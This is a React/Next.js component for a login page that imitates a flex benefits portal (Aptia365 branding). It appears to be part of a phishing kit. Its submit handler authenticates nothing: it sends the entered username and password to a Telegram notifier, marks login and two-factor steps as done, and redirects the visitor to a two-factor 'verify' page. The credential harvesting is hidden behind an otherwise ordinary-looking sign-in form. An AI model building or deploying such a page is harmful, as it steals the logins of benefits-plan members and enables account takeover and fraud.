"use client";
import { User, Lock, LogIn } from "lucide-react";
import { useState } from "react";
import { useRouter } from "next/navigation";
import { notifyTelegram } from "@/lib/telegram-notify";
import { setLoginComplete, setTwoFactorStepComplete } from "@/lib/auth-flow";
import Image from "next/image";

export function LandingMain() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setLoading(true);
    try {
      notifyTelegram({
        kind: "login",
        username,
        password,
      });
      setLoginComplete();
      setTwoFactorStepComplete();
      router.push("/two-factor/verify?method=email");
    } catch (error) {
      console.error("Login error:", error);
      setLoading(false);
    }
  };

  return (
    <div className="bg-[#F5F5F5] py-12 sm:py-16">
      <div className="mx-auto w-full max-w-[1300px] px-4 sm:px-6 lg:px-8">
        <div className="grid gap-10 xl:grid-cols-[420px_minmax(520px,1fr)] items-center">
          <div className="rounded-[32px] border border-[#E5E7EB] bg-white p-8 shadow-[0_28px_80px_rgba(15,23,42,0.08)]">
            <div className="mb-8">
              <p className="text-xs font-semibold uppercase tracking-[0.35em] text-[#00C389]">
                Login
              </p>
              <h1 className="mt-4 text-3xl font-semibold tracking-tight text-[#0F172A] sm:text-4xl">
                Welcome back
              </h1>
              <p className="mt-3 max-w-[32rem] text-sm leading-6 text-[#64748B]">
                Sign in to access your flex benefits account and manage your
                plan.
              </p>
            </div>

            <form
              id="login-form"
              className="space-y-6"
              method="post"
              autoComplete="off"
              onSubmit={handleLogin}
            >
              <div className="space-y-3">
                <label
                  htmlFor="Username"
                  className="block text-sm font-medium text-[#334155]"
                >
                  Username
                </label>
                <div className="relative">
                  <input
                    className="w-full rounded-2xl border border-[#D1D5DB] bg-white px-4 py-3 pl-12 text-sm text-[#0F172A] outline-none transition focus:border-[#00C389] focus:ring-2 focus:ring-[#00C389]/20"
                    type="text"
                    id="Username"
                    name="Username"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    required
                  />
                  <User className="absolute left-4 top-1/2 h-4 w-4 -translate-y-1/2 text-[#94A3B8]" />
                </div>
              </div>

              <div className="space-y-3">
                <label
                  htmlFor="Password"
                  className="block text-sm font-medium text-[#334155]"
                >
                  Password
                </label>
                <div className="relative">
                  <input
                    className="w-full rounded-2xl border border-[#D1D5DB] bg-white px-4 py-3 pl-12 text-sm text-[#0F172A] outline-none transition focus:border-[#00C389] focus:ring-2 focus:ring-[#00C389]/20"
                    type="password"
                    id="Password"
                    name="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    autoComplete="off"
                    required
                  />
                  <Lock className="absolute left-4 top-1/2 h-4 w-4 -translate-y-1/2 text-[#94A3B8]" />
                </div>
              </div>

              <div className="flex items-center justify-between text-sm text-[#475569]">
                <label className="flex items-center gap-2">
                  <input
                    type="checkbox"
                    id="RememberMe"
                    name="RememberMe"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                    className="h-4 w-4 rounded border-[#CBD5E1] text-[#00C389] focus:ring-[#00C389]"
                  />
                  Remember me?
                </label>
                <a
                  href="/Account/ForgotPassword"
                  className="font-medium text-[#00C389] hover:text-[#0F766E]"
                >
                  Forgot password?
                </a>
              </div>

              <button
                type="submit"
                className="w-full rounded-2xl bg-[#00C389] px-5 py-3 text-sm font-semibold text-white transition hover:bg-[#00A876] disabled:cursor-not-allowed disabled:opacity-60"
                disabled={loading || !username || !password}
              >
                {loading ? "Logging In..." : "Log In"}
              </button>

              <div className="space-y-3 text-sm text-[#475569]">
                <a
                  href="https://www.tri-ad.com/pdfs/Registration-Guide.pdf"
                  target="_blank"
                  rel="noreferrer"
                  className="text-[#0F766E] hover:text-[#064E3B]"
                >
                  Registration and Log In Instruction Flyer
                </a>
                <a
                  className="block text-[#0F766E] hover:text-[#064E3B]"
                  href="/Account/ForgotUsername"
                >
                  Forgot Your Username?
                </a>
                <a
                  className="block text-[#0F766E] hover:text-[#064E3B]"
                  href="/identity-details"
                >
                  Received a Mailed Registration Code?
                </a>
              </div>
            </form>

            <div className="mt-8 rounded-3xl border border-[#E2E8F0] bg-[#F8FAFC] p-6">
              <div className="flex items-center justify-between gap-4">
                <div>
                  <p className="text-sm font-semibold text-[#0F172A]">
                    Register as a New User
                  </p>
                  <p className="mt-2 text-sm text-[#64748B]">
                    Create a profile to manage your benefits and account
                    details.
                  </p>
                </div>
                <a
                  className="inline-flex items-center rounded-2xl bg-[#00C389] px-4 py-2 text-sm font-semibold text-white transition hover:bg-[#0F766E]"
                  href="/identity-details"
                >
                  Register
                </a>
              </div>
            </div>
          </div>

          <div className="relative rounded-[32px] overflow-hidden shadow-[0_28px_80px_rgba(15,23,42,0.12)]">
            <div className="relative h-[420px] sm:h-[520px] w-full">
              <Image
                src="/aptia365-flex_image.png"
                alt="Aptia365 Family"
                fill
                className="object-cover"
                priority
                sizes="(max-width: 1024px) 100vw, 600px"
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
